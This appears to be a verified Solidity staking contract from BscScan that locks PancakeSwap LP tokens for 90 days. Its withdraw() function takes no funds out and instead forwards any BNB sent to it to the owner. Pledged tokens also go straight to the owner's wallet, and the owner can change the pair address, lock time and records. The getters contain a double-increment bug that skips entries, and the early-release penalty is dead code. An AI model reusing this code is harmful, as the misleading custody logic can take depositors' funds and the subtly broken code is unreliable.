/**
 *Submitted for verification at BscScan.com on 2022-07-25
*/

pragma solidity ^0.6.0;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        return a % b;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IPancakePair {
    function totalSupply() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract ARTLP {
    
    event Withdraw(address indexed account,uint256 amount);
    event Deposit(address indexed account,uint256 amount);
    event Pledge(address indexed account,uint256 amount,uint256 timestamp);
    event Release(address indexed account,uint256 amount,uint256 timestamp,uint256 realAmount);

    struct PledgeRecord {
        address account;
        uint256 timestamp;
        uint256 amount;
        uint8 isRelease;
    }
    struct ReleaseRecord{
        address account;
        uint256 timestamp;
        uint256 amount;
        uint256 releaseTimestamp;
    }

    PledgeRecord[] private _pledgeRecords;
    ReleaseRecord[] private _releaseRecords;

    address payable private _master;
    using SafeMath  for uint;

    address private PAIR_ART_USDT = 0xc49ae9b73AACfE69A432A80f2073f2C43bc87097;

    mapping (address => uint256) private _balances;
    uint256 private _totalSupply;
    uint256 private _minTimestamp = 90*86400;

    constructor () public{
        _master = msg.sender;
    }

    function withdraw() payable public  {
        _master.transfer(msg.value);
        emit Withdraw(msg.sender,msg.value);
    }
    function deposit() payable public{
        _master.transfer(msg.value);
        emit Deposit(msg.sender,msg.value);
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function pledge(uint256 amount) public returns(bool status){
        require(amount > 0 ,"error");
        require(IPancakePair(PAIR_ART_USDT).transferFrom(msg.sender,_master,amount),"transfer error");
        _totalSupply = _totalSupply.add(amount);
        _balances[msg.sender] = _balances[msg.sender].add(amount);

        uint256 timestamp = block.timestamp;
        uint8 isRelease = 1;
        (isRelease,) = findRecord(msg.sender,timestamp);
        if(isRelease == 0){timestamp=timestamp.add(1);}

        PledgeRecord memory pledgeRecord= PledgeRecord(msg.sender,timestamp,amount,0);
        _pledgeRecords.push(pledgeRecord);
        emit Pledge(msg.sender,amount,timestamp);
        return true;
    }

    function release(uint256 timestamp) public returns(bool status){
        uint8 isRelease;uint256 amount;
        (isRelease,amount) = findRecord(msg.sender,timestamp);
        require(amount>0,"Pledge not found");
        require(isRelease == 0, "Pledge released");
        require( block.timestamp.sub(timestamp) > _minTimestamp ,"Time is not up");
        bool isTime = block.timestamp.sub(timestamp) > _minTimestamp;
        uint256 realAmount = amount;
        if (isTime) {
            require(IPancakePair(PAIR_ART_USDT).transferFrom(_master,msg.sender,amount),"transfer error");
        } else {
            realAmount = amount.mul(8).div(10);
            require(IPancakePair(PAIR_ART_USDT).transferFrom(_master,msg.sender,amount),"transfer error");
        }
        _totalSupply = _totalSupply.sub(amount);
        _balances[msg.sender] = _balances[msg.sender].sub(amount);
        updateRecord(msg.sender,timestamp);
        ReleaseRecord memory releaseRecord = ReleaseRecord(msg.sender,timestamp,amount,block.timestamp);
        _releaseRecords.push(releaseRecord);
        emit Release(msg.sender,amount,timestamp,realAmount);
        return true;
    }

    function getMaster() public view returns (address){
        return _master;
    }

    function setMaster(address payable addr) public {
        require(msg.sender == _master);
        _master = addr;
    }

    function setPair(address addr) public{
        require(msg.sender == _master);
        PAIR_ART_USDT = addr;
    }

    function getPair() public view returns (address){
        return PAIR_ART_USDT;
    }

    function setMinTimestamp(uint256 timeInval) public {
        require(msg.sender == _master);
        _minTimestamp=timeInval;
    }

    function getMinTimestamp() public view returns (uint256) {
        return _minTimestamp;
    }

    function addRecord(address account,uint256 timestamp,uint256 amount) public{
        require(msg.sender == _master);
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        PledgeRecord memory pledgeRecord= PledgeRecord(account,timestamp,amount,0);
        _pledgeRecords.push(pledgeRecord);
        emit Pledge(account,amount,timestamp);
    }

    function editRecord(address account,uint256 timestamp) public {
        require(msg.sender == _master);
        updateRecord(account,timestamp);
    }

    function updateRecord(address account,uint256 timestamp) private {
        for(uint i = 0;i < _pledgeRecords.length;i++){
            if(_pledgeRecords[i].account==account && _pledgeRecords[i].timestamp==timestamp){
                _pledgeRecords[i].isRelease = 1;
                break;
            }
        }
    }

    function findRecord(address account,uint256 timestamp)view public returns(uint8 isRelease,uint256 amount){
        isRelease = 1;
        amount = 0;
        for(uint i=0;i < _pledgeRecords.length;i++){
            if(_pledgeRecords[i].account==account && _pledgeRecords[i].timestamp == timestamp){
                isRelease = _pledgeRecords[i].isRelease;
                amount = _pledgeRecords[i].amount;
                break;
            }
        }
    }

    function getReleaseRecordSizes() view public returns(uint256 size){
        return _releaseRecords.length;
    }

    function getReleaseRecords()view public returns(address [] memory addressList,
        uint256 [] memory pledgeTimeList,
        uint256 [] memory amountList,
        uint256 [] memory realeaseTimestampList){
    
        uint256 leng = _releaseRecords.length;
       
        addressList = new address[](leng);
        pledgeTimeList = new uint256[](leng);
        amountList = new uint256[](leng);
        realeaseTimestampList=new uint256[](leng);
      
        for(uint256 i=0;i < leng;i++){
            pledgeTimeList[i]=_releaseRecords[i].timestamp;
            realeaseTimestampList[i]=_releaseRecords[i].releaseTimestamp;
            amountList[i]=_releaseRecords[i].amount;
            addressList[i]=_releaseRecords[i].account;
            i++;
        }
    }

    function getPledgeRecordsSize() view public returns(uint256 size){
       return _pledgeRecords.length;
    }

    function getPledgeRecords() view public returns (address [] memory addressList,
        uint256 [] memory pledgeTimeList,
        uint256 [] memory amountList,uint8 [] memory isReleaseList){
        uint256 leng = _pledgeRecords.length;
        pledgeTimeList=new uint256[](leng);
        amountList=new uint256[](leng);
        addressList =new address[](leng);
        isReleaseList=new uint8[](leng);
        for(uint256 i=0;i < leng;i++){
            addressList[i]=_pledgeRecords[i].account;
            pledgeTimeList[i]=_pledgeRecords[i].timestamp;
            amountList[i]=_pledgeRecords[i].amount;
            isReleaseList[i]=_pledgeRecords[i].isRelease;
            i++;
        }
    }

}